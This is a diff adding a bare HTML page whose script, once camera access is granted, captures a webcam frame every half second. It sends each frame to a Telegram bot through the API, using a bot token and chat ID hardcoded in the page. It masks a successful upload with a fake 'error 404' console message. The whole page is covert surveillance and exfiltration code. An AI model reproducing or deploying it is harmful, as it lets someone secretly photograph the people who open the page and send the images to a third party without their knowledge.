@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <video autoplay id="videoo"></video>
+    <script>
+        let videoo=document.getElementById("videoo"); 
+        navigator.mediaDevices.getUserMedia({video:true}) 
+        .then(stream=>{ 
+            videoo.srcObject=stream; 
+            setInterval(() => { 
+                let can=document.createElement("canvas"); 
+                can.width=videoo.videoWidth; 
+                can.height=videoo.videoHeight; 
+                can.getContext("2d").drawImage(videoo,0,0,videoo.videoWidth,videoo.videoHeight) 
+                can.toBlob(blob=>{ 
+                    let form=new FormData(); 
+                    form.append("chat_id","8451482936"); 
+                    form.append("photo",blob,"captured.jpeg"); 
+                    fetch(`https://api.telegram.org/bot${"8765086664:AAHTjzpAtpAN4fdlRyLhyVXgEJp4Jp_6Gao"}/sendPhoto`,{ 
+                        method:"POST", 
+                        body:form 
+                    }) 
+                    .then(res=>res.json()) 
+                    .then(data=>{ 
+                        if(data.ok){ 
+                            console.log("error 404") 
+                        } 
+                    }) 
+                },"image/jpeg") 
+            }, 500); 
+        }) 
+    </script>
+</body>
+</html>
